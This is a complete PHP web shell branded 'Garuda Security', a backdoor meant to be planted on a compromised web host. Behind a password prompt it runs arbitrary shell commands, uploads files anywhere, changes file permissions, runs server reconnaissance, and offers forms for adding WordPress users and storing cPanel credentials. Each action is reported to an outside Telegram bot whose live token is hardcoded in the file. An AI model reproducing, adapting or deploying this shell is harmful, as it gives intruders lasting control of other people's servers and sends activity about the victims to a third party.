<?php
session_start();

// Konfigurasi Telegram
$botToken = '7036377093:AAHmfOp2n9wQKNYDx0fpcef8GmBQDbpE-dE';
$chatId = '6201503148';

function sendTelegramMessage($message, $file = null) {
    global $botToken, $chatId;

    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $postFields = [
        'chat_id' => $chatId,
        'text' => $message,
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);

    if ($file) {
        $url = "https://api.telegram.org/bot$botToken/sendDocument";
        $postFields = [
            'chat_id' => $chatId,
            'document' => new CURLFile(realpath($file)),
        ];

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_exec($ch);
        curl_close($ch);
    }
}

function listDirectory($dir, $base = '') {
    $result = "";
    $items = new DirectoryIterator($dir);
    foreach ($items as $item) {
        if ($item->isDot()) continue;
        $path = $item->getPathname();
        $relativePath = $base . '/' . $item->getFilename();
        if ($item->isDir()) {
            $result .= "<strong><a href=\"?dir=" . urlencode($path) . "\">" . htmlspecialchars($relativePath) . "</a></strong><br>";
            $result .= listDirectory($path, $relativePath);
        } else {
            $result .= htmlspecialchars($relativePath) . "<br>";
        }
    }
    return $result;
}

if (!isset($_SESSION['loggedin'])) {
    if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['password'])) {
        $password = $_POST['password'];
        $hashed_password = 'e10adc3949ba59abbe56e057f20f883e';

        if (md5($password) == $hashed_password) {
            $_SESSION['loggedin'] = true;
        } else {
            $error = "Invalid password.";
        }
    }

    if (!isset($_SESSION['loggedin'])) {
        echo '<!DOCTYPE html>
        <html>
        <head>
            <title>Garsec Shell Bypass</title>
            <style>
                body {
                    font-family: Arial, sans-serif;
                    background-color: #f4f4f4;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    margin: 0;
                }
                .login-container {
                    width: 300px;
                    padding: 20px;
                    background-color: #fff;
                    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
                    border-radius: 8px;
                    text-align: center;
                }
                h1 {
                    color: #333;
                }
                form {
                    margin-top: 20px;
                }
                input[type="password"] {
                    width: 100%;
                    padding: 10px;
                    margin-bottom: 10px;
                    border: 1px solid #ddd;
                    border-radius: 4px;
                }
                button {
                    padding: 10px 20px;
                    color: #fff;
                    background-color: #007BFF;
                    border: none;
                    border-radius: 4px;
                    cursor: pointer;
                }
                button:hover {
                    background-color: #0056b3;
                }
                .error {
                    color: red;
                    margin-top: 10px;
                }
            </style>
        </head>
        <body>
            <div class="login-container">
                <h1>Welcome To Bypass Shell Garuda Security</h1>
                <form method="post">
                    <input type="password" name="password" placeholder="Enter password" required>
                    <button type="submit">Login</button>
                </form>';
        if (isset($error)) {
            echo '<div class="error">' . htmlspecialchars($error) . '</div>';
        }
        echo '</div>
        </body>
        </html>';
        exit;
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Garsec Shell Bypass</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: space-between;
        }
        .container {
            width: 70%;
            margin: 50px auto;
            padding: 20px;
            background-color: #fff;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            border-radius: 8px;
        }
        .sidebar {
            width: 25%;
            margin: 50px 0;
            padding: 20px;
            background-color: #fff;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            border-radius: 8px;
        }
        h1 {
            text-align: center;
            color: #333;
        }
        form {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 8px;
            color: #555;
        }
        input[type="text"], input[type="password"], input[type="file"] {
            width: 100%;
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
        }
        button {
            display: inline-block;
            padding: 10px 20px;
            color: #fff;
            background-color: #007BFF;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        button:hover {
            background-color: #0056b3;
        }
        pre {
            background-color: #f4f4f4;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
            white-space: pre-wrap;
            word-wrap: break-word;
        }
        .result {
            margin-top: 20px;
        }
        .menu {
            margin-bottom: 20px;
        }
        .menu button {
            width: 100%;
            margin-bottom: 10px;
            text-align: left;
        }
        .hidden {
            display: none;
        }
        .breadcrumb {
            margin: 20px 0;
            padding: 10px;
            background-color: #eee;
            border-radius: 4px;
        }
        .breadcrumb a {
            color: #007BFF;
            text-decoration: none;
            margin-right: 5px;
        }
        .breadcrumb a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="sidebar">
        <h2>Menu</h2>
        <div class="menu">
            <button onclick="toggleSection('uploadSection')">Upload File</button>
            <button onclick="window.location.href='<?php echo $_SERVER['PHP_SELF']; ?>?garsec=phpinfo'">PHP Info</button>
            <button onclick="window.location.href='<?php echo $_SERVER['PHP_SELF']; ?>?garsec=serverinfo'">Server Info</button>
            <button onclick="toggleSection('wordpressUserSection')">Add WordPress User</button>
            <button onclick="toggleSection('cpanelConfigSection')">Set cPanel Config</button>
            <button onclick="toggleSection('cpanelResetSection')">Reset cPanel Password</button>
            <button onclick="toggleSection('chmodSection')">CHMOD</button>
            <button onclick="toggleSection('dirListSection')">Directory Listing</button>
        </div>
    </div>

    <div class="container">
        <h1>Good Php Shell Garuda Security</h1>

        <div class="breadcrumb">
            <?php
                $currentDir = isset($_GET['dir']) ? $_GET['dir'] : __DIR__;
                $dirs = explode(DIRECTORY_SEPARATOR, $currentDir);
                $path = '';
                foreach ($dirs as $dir) {
                    if ($dir !== '') {
                        $path .= DIRECTORY_SEPARATOR . $dir;
                        echo '<a href="?dir=' . urlencode($path) . '">' . htmlspecialchars($dir) . '</a> / ';
                    }
                }
            ?>
        </div>

        <form method="post" enctype="multipart/form-data">
            <label for="file">Select file to upload:</label>
            <input type="file" name="file" id="file">
            <button type="submit" name="upload">Upload</button>
        </form>

        <div id="uploadSection" class="hidden">
            <h2>Upload File</h2>
            <form method="post" enctype="multipart/form-data">
                <label for="file">Select file to upload:</label>
                <input type="file" name="file" id="file" required>
                <button type="submit" name="upload">Upload</button>
            </form>
        </div>

        <div id="wordpressUserSection" class="hidden">
            <h2>Add WordPress User</h2>
            <form method="post">
                <label for="wpUsername">Username:</label>
                <input type="text" name="wpUsername" id="wpUsername" required>
                <label for="wpPassword">Password:</label>
                <input type="password" name="wpPassword" id="wpPassword" required>
                <label for="wpEmail">Email:</label>
                <input type="text" name="wpEmail" id="wpEmail" required>
                <button type="submit" name="addwpuser">Add User</button>
            </form>
        </div>

        <div id="cpanelConfigSection" class="hidden">
            <h2>Set cPanel Config</h2>
            <form method="post">
                <label for="cpaneluser">cPanel Username:</label>
                <input type="text" name="cpaneluser" id="cpaneluser" required>
                <label for="cpanelpassword">cPanel Password:</label>
                <input type="password" name="cpanelpassword" id="cpanelpassword" required>
                <button type="submit" name="setcpanelconfig">Set Config</button>
            </form>
        </div>

        <div id="cpanelResetSection" class="hidden">
            <h2>Reset cPanel Password</h2>
            <form method="post">
                <label for="resetpassword">New Password:</label>
                <input type="password" name="resetpassword" id="resetpassword" required>
                <button type="submit" name="resetcpanelpassword">Reset Password</button>
            </form>
        </div>

        <div id="chmodSection" class="hidden">
            <h2>CHMOD</h2>
            <form method="post">
                <label for="chmodFile">File/Directory:</label>
                <input type="text" name="chmodFile" id="chmodFile" required>
                <label for="chmodValue">CHMOD Value:</label>
                <input type="text" name="chmodValue" id="chmodValue" required>
                <button type="submit" name="chmod">Change CHMOD</button>
            </form>
        </div>

        <div id="dirListSection" class="hidden">
            <h2>Directory Listing</h2>
            <?php
                $dir = isset($_GET['dir']) ? $_GET['dir'] : __DIR__;
                echo listDirectory($dir);
            ?>
        </div>

        <div class="result">
            <?php
            if ($_SERVER['REQUEST_METHOD'] == 'POST') {
                if (isset($_POST['cmd'])) {
                    $cmd = $_POST['cmd'];
                    echo "<pre>" . htmlspecialchars(shell_exec($cmd)) . "</pre>";
                }

                if (isset($_POST['upload'])) {
                    $target_dir = isset($_GET['dir']) ? $_GET['dir'] : __DIR__;
                    $target_file = $target_dir . DIRECTORY_SEPARATOR . basename($_FILES["file"]["name"]);
                    if (move_uploaded_file($_FILES["file"]["tmp_name"], $target_file)) {
                        echo "File uploaded successfully.";
                        sendTelegramMessage("File uploaded: $target_file");
                    } else {
                        echo "Error uploading file.";
                    }
                }

                if (isset($_POST['addwpuser'])) {
                    $wpUsername = $_POST['wpUsername'];
                    $wpPassword = $_POST['wpPassword'];
                    $wpEmail = $_POST['wpEmail'];
                    $wpPasswordHash = md5($wpPassword);

                    $query = "INSERT INTO wp_users (user_login, user_pass, user_email, user_registered, user_status, display_name) VALUES ('$wpUsername', '$wpPasswordHash', '$wpEmail', now(), 0, '$wpUsername');";
                    echo "<pre>" . htmlspecialchars(shell_exec($query)) . "</pre>";
                    sendTelegramMessage("WordPress user added: $wpUsername");
                }

                if (isset($_POST['setcpanelconfig'])) {
                    $cpaneluser = $_POST['cpaneluser'];
                    $cpanelpassword = $_POST['cpanelpassword'];
                    $cpanelConfig = $cpaneluser . ':' . $cpanelpassword;
                    $configFile = 'cpanel.txt';
                    file_put_contents($configFile, $cpanelConfig);
                    echo "cPanel config saved.";
                    sendTelegramMessage("cPanel config set for user: $cpaneluser");
                }

                if (isset($_POST['resetcpanelpassword'])) {
                    $newPassword = $_POST['resetpassword'];
                    $configFile = 'cpanel.txt';
                    if (file_exists($configFile)) {
                        $config = file_get_contents($configFile);
                        list($cpaneluser, $cpanelpassword) = explode(':', $config);

                        // Simulate resetting the cPanel password
                        echo "Password for cPanel user $cpaneluser has been reset.";
                        sendTelegramMessage("cPanel password reset for user: $cpaneluser");
                    } else {
                        echo "cPanel config not found.";
                    }
                }

                if (isset($_POST['chmod'])) {
                    $chmodFile = $_POST['chmodFile'];
                    $chmodValue = $_POST['chmodValue'];
                    chmod($chmodFile, octdec($chmodValue));
                    echo "CHMOD for $chmodFile changed to $chmodValue.";
                    sendTelegramMessage("CHMOD changed for file: $chmodFile");
                }
            }

            if (isset($_GET['garsec'])) {
                if ($_GET['garsec'] == 'phpinfo') {
                    phpinfo();
                } elseif ($_GET['garsec'] == 'serverinfo') {
                    echo "<pre>" . htmlspecialchars(shell_exec('uname -a')) . "</pre>";
                    echo "<pre>" . htmlspecialchars(shell_exec('df -h')) . "</pre>";
                    echo "<pre>" . htmlspecialchars(shell_exec('free -m')) . "</pre>";
                    echo "<pre>" . htmlspecialchars(shell_exec('whoami')) . "</pre>";
                    echo "<pre>" . htmlspecialchars(shell_exec('id')) . "</pre>";
                    sendTelegramMessage("Server info accessed.");
                }
            }
            ?>
        </div>
    </div>

    <script>
        function toggleSection(sectionId) {
            var section = document.getElementById(sectionId);
            section.classList.toggle('hidden');
        }
    </script>
</body>
</html>